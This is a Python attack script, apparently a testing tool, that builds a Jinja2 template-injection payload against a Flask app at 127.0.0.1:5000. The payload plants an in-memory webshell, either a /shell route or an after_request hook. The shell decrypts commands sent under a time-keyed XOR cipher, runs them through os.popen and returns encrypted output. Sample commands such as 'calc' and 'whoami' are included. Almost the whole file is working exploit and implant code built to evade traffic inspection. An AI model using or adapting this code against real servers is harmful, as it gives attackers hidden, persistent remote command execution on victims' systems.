import hashlib
import random
import base64
import time
import urllib

import requests
from flask import request

class RandXor(object):
    """ 动态异或加解密，密钥随时间变化 """

    def __init__(self, shell_password):
        self.shell_password = shell_password
        self.rkey = len(shell_password)  # rkey为密码长度

    def get_md5(self, data):
        """ 生成MD5哈希 """
        md5 = hashlib.md5()
        md5.update(data.encode('utf-8'))
        return md5.hexdigest()

    def generate_key(self, timestamp):
        """ 根据时间戳生成动态密钥 """
        # 组合密码、盐和时间戳生成唯一数据
        dynamic_data = f"{self.shell_password}{timestamp}"
        md5_part = self.get_md5(dynamic_data)[8:24]  # 取MD5中间部分
        return hashlib.sha256(md5_part.encode()).digest()

    def encrypt(self, plaintext):
        """ 加密并嵌入时间戳 """
        plaintext = base64.b64decode(plaintext)
        current_time = int(time.time())
        key = self.generate_key(current_time)

        # 在密文前添加4字节时间戳
        time_bytes = current_time.to_bytes(4, byteorder='big')
        ciphertext = bytearray(len(plaintext) + 4)
        ciphertext[0:4] = time_bytes

        # 初始化随机数生成器（密码长度+时间戳作为种子）
        random.seed(self.rkey + current_time)

        # 动态异或加密
        for i in range(len(plaintext)):
            # 加密步骤：先异或rkey，再异或动态因子
            byte_val = plaintext[i] ^ self.rkey
            rand_val = random.randint(1, len(plaintext)) & 0xff
            ciphertext[i + 4] = byte_val ^ rand_val ^ key[i % len(key)]

        return base64.b64encode(ciphertext).decode('utf-8')

    def decrypt(self, ciphertext):
        """ 从密文中提取时间戳并解密 """
        ciphertext = base64.b64decode(ciphertext)
        time_bytes = ciphertext[0:4]
        current_time = int.from_bytes(time_bytes, byteorder='big')
        key = self.generate_key(current_time)
        print('a')
        print(key)
        ciphertext_body = ciphertext[4:]
        plaintext = bytearray(len(ciphertext_body))

        # 初始化相同的随机数种子
        random.seed(self.rkey + current_time)

        # 动态异或解密
        for i in range(len(ciphertext_body)):
            # 解密步骤：先异或动态因子，再异或rkey
            rand_val = random.randint(1, len(ciphertext_body)) & 0xff
            byte_val = ciphertext_body[i] ^ rand_val ^ key[i % len(key)]
            plaintext[i] = byte_val ^ self.rkey

        return base64.b64encode(plaintext).decode('utf-8')


rx = RandXor('pass')

shell = f"""
def shell_func():
    import base64
    import random
    import time
    import hashlib
    def generate_key(timestamp):
        dynamic_str = 'pass'+str(timestamp)
        md5_part = hashlib.md5(dynamic_str.encode()).hexdigest()[8:24]
        return hashlib.sha256(md5_part.encode()).digest()
    parma = {{'resp': 'Error', 'app': app, 'gl': ulg}}
    p_code = request.get_data(as_text=True)
    ciphertext = base64.b64decode(p_code)
    timestamp = int.from_bytes(ciphertext[:4], byteorder='big')
    ciphertext_body = ciphertext[4:]
    key = generate_key(timestamp)
    rkey = 4
    plaintext = bytearray(len(ciphertext_body))
    random.seed(rkey + timestamp)
    for i in range(len(ciphertext_body)):
        rand_val = random.randint(1, len(ciphertext_body)) & 0xff
        byte_val = ciphertext_body[i] ^ rand_val ^ key[i % len(key)]
        plaintext[i] = byte_val ^ rkey
    exec(plaintext.decode('utf-8'), parma)
    resp_data = str(parma['resp']).encode('utf-8')
    current_time = int(time.time())
    resp_key = generate_key(current_time)
    ciphertext = bytearray(len(resp_data) + 4)
    ciphertext[:4] = current_time.to_bytes(4, byteorder='big')
    random.seed(rkey + current_time)
    for i in range(len(resp_data)):
        byte_val = resp_data[i] ^ rkey
        rand_val = random.randint(1, len(resp_data)) & 0xff
        ciphertext[i+4] = byte_val ^ rand_val ^ resp_key[i % len(resp_key)]
    parma['resp'] = base64.b64encode(ciphertext).decode('utf-8')
    return str(parma['resp'])
"""

output = f"""
url_for.__globals__['__builtins__']['exec'](
    "exec(__import__('base64').b64decode('{base64.b64encode(shell.encode('utf-8')).decode('utf-8')}'));app.view_functions['shell'] = shell_func;app._got_first_request=False;app.add_url_rule('/shell', 'shell', shell_func, methods=['POST','GET']);app._got_first_request=True;", 
    {{'request':url_for.__globals__['request'],'ulg': url_for.__globals__, 'app':url_for.__globals__['current_app']}}
)
"""
print(output)
print(base64.b64encode(shell.encode('utf-8')).decode('utf-8'))
# 使用示例
payload = """
import os
resp = os.popen('calc')
"""

# 加密流程
payload_encoded = base64.b64encode(payload.encode('utf-8')).decode('utf-8')  # 预编码
encrypted = rx.encrypt(payload_encoded)
print('加密结果:', encrypted)

# 解密流程
decrypted = rx.decrypt(encrypted)
decrypted_payload = base64.b64decode(decrypted).decode('utf-8')
print('解密结果:', decrypted_payload)


session = requests.session()
# print(session.get(f'http://127.0.0.1:5000/?name={output}').text)
# print(session.get(f'http://127.0.0.1:5000/shell', data=encrypted).text)

#text="""http://127.0.0.1:5000/?name={{url_for.__globals__['__builtins__']['eval']("app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get('cmd') and exec(\\"global CmdResp;import base64;CmdResp=__import__(\\'flask\\').make_response(__import__(\\'os\\').popen(request.args.get(\\'cmd\\')).read())\\")==None else resp)",{'request':url_for.__globals__['request'],'app':url_for.__globals__['current_app']})}}"""
#__import__('base64').b64decode('{base64.b64encode(shell.encode('utf-8')).decode('utf-8')}')

# text="""http://127.0.0.1:5000/?name={{url_for.__globals__['__builtins__']['eval']("app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get('cmd') and exec(\\"global CmdResp;import base64;exec(__import__(\\'base64\\').b64decode(\\'"""+ base64.b64encode(shell2.encode('utf-8')).decode('utf-8') +"""\\'));CmdResp=__import__(\\'flask\\').make_response(__import__(\\'os\\').popen( shell_func(request.args.get(\\'cmd\\')) ).read() )\\")==None else resp)",{'request':url_for.__globals__['request'],'app':url_for.__globals__['current_app']})}}"""
# print(session.get(text.replace("'", "%27").replace('"','%22').replace(' ', '%20')).text)
# print(session.get(f'http://127.0.0.1:5000/?cmd={rx.encrypt(base64.b64encode("calc".encode('utf-8')).decode('utf-8'))}').text)
# print(rx.encrypt(base64.b64encode("calc".encode('utf-8')).decode('utf-8')))

class RandXor(object):
    """ 动态异或加解密，密钥随时间变化 """

    def __init__(self, shell_password):
        self.shell_password = shell_password
        self.rkey = len(shell_password)  # rkey为密码长度

    def get_md5(self, data):
        """ 生成MD5哈希 """
        md5 = hashlib.md5()
        md5.update(data.encode('utf-8'))
        return md5.hexdigest()

    def generate_key(self, timestamp):
        """ 根据时间戳生成动态密钥 """
        # 组合密码、盐和时间戳生成唯一数据
        dynamic_data = f"{self.shell_password}{timestamp}"
        md5_part = self.get_md5(dynamic_data)[8:24]  # 取MD5中间部分
        return hashlib.sha256(md5_part.encode()).digest()

    def encrypt(self, plaintext):
        """ 加密并嵌入时间戳 """
        plaintext = base64.b64decode(plaintext)
        current_time = int(time.time())
        key = self.generate_key(current_time)

        # 在密文前添加4字节时间戳
        time_bytes = current_time.to_bytes(4, byteorder='big')
        ciphertext = bytearray(len(plaintext) + 4)
        ciphertext[0:4] = time_bytes

        # 初始化随机数生成器（密码长度+时间戳作为种子）
        random.seed(self.rkey + current_time)

        # 动态异或加密
        for i in range(len(plaintext)):
            # 加密步骤：先异或rkey，再异或动态因子
            byte_val = plaintext[i] ^ self.rkey
            rand_val = random.randint(1, len(plaintext)) & 0xff
            ciphertext[i + 4] = byte_val ^ rand_val ^ key[i % len(key)]

        return base64.b64encode(ciphertext).decode('utf-8')

    def decrypt(self, ciphertext):
        """ 从密文中提取时间戳并解密 """
        ciphertext = base64.b64decode(ciphertext)
        time_bytes = ciphertext[0:4]
        current_time = int.from_bytes(time_bytes, byteorder='big')
        key = self.generate_key(current_time)
        print('a')
        print(key)
        ciphertext_body = ciphertext[4:]
        plaintext = bytearray(len(ciphertext_body))

        # 初始化相同的随机数种子
        random.seed(self.rkey + current_time)

        # 动态异或解密
        for i in range(len(ciphertext_body)):
            # 解密步骤：先异或动态因子，再异或rkey
            rand_val = random.randint(1, len(ciphertext_body)) & 0xff
            byte_val = ciphertext_body[i] ^ rand_val ^ key[i % len(key)]
            plaintext[i] = byte_val ^ self.rkey

        return base64.b64encode(plaintext).decode('utf-8')

shell2 = f"""
def decrypt_func(p_code):
    import base64
    import random
    import time
    import hashlib
    def generate_key(timestamp):
        dynamic_str = '{rx.shell_password}'+str(timestamp)
        md5_part = hashlib.md5(dynamic_str.encode()).hexdigest()[8:24]
        return hashlib.sha256(md5_part.encode()).digest()
    ciphertext = base64.b64decode(p_code)
    timestamp = int.from_bytes(ciphertext[:4], byteorder='big')
    ciphertext_body = ciphertext[4:]
    key = generate_key(timestamp)
    rkey = {rx.rkey}
    plaintext = bytearray(len(ciphertext_body))
    random.seed(rkey + timestamp)
    for i in range(len(ciphertext_body)):
        rand_val = random.randint(1, len(ciphertext_body)) & 0xff
        byte_val = ciphertext_body[i] ^ rand_val ^ key[i % len(key)]
        plaintext[i] = byte_val ^ rkey
    return plaintext.decode('utf-8')
def encrypt_func(plaintext):
    import base64
    import random
    import time
    import hashlib
    def generate_key(timestamp):
        dynamic_str = '{rx.shell_password}'+str(timestamp)
        md5_part = hashlib.md5(dynamic_str.encode()).hexdigest()[8:24]
        return hashlib.sha256(md5_part.encode()).digest()
    plaintext = base64.b64encode(plaintext.encode('utf-8')).decode('utf-8')
    plaintext = base64.b64decode(plaintext)
    current_time = int(time.time())
    key = generate_key(current_time)
    time_bytes = current_time.to_bytes(4, byteorder='big')
    ciphertext = bytearray(len(plaintext) + 4)
    ciphertext[0:4] = time_bytes
    random.seed({rx.rkey} + current_time)
    for i in range(len(plaintext)):
        byte_val = plaintext[i] ^ {rx.rkey}
        rand_val = random.randint(1, len(plaintext)) & 0xff
        ciphertext[i + 4] = byte_val ^ rand_val ^ key[i % len(key)]
    return base64.b64encode(ciphertext).decode('utf-8')
"""
text="""http://127.0.0.1:5000/?name={{url_for.__globals__['__builtins__']['eval']("app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.get_data(as_text=True) and exec(\\"global CmdResp;import base64;exec(__import__(\\'base64\\').b64decode(\\'"""+ base64.b64encode(shell2.encode('utf-8')).decode('utf-8') +"""\\'));CmdResp=__import__(\\'flask\\').make_response(encrypt_func(__import__(\\'os\\').popen( decrypt_func(request.get_data(as_text=True)) ).read() ))\\")==None else resp)",{'request':url_for.__globals__['request'],'app':url_for.__globals__['current_app']})}}"""
print(session.get(text.replace("'", "%27").replace('"','%22').replace(' ', '%20')).text)
def generate_chunks(data_string, chunk_length=5):
    """将字符串按固定长度分割为字节块"""
    for i in range(0, len(data_string), chunk_length):
        chunk = data_string[i:i+chunk_length]
        yield chunk.encode("utf-8")  # 转为字节流
encrypted = rx.encrypt(base64.b64encode("""whoami""".encode('utf-8')).decode('utf-8'))
res = session.get('http://127.0.0.1:5000/', data=generate_chunks(encrypted)).text
decrypted = rx.decrypt(res)
decrypted_payload = base64.b64decode(decrypted).decode('utf-8')
print(decrypted_payload)
#print(rx.encrypt(base64.b64encode("calc".encode('utf-8')).decode('utf-8')))
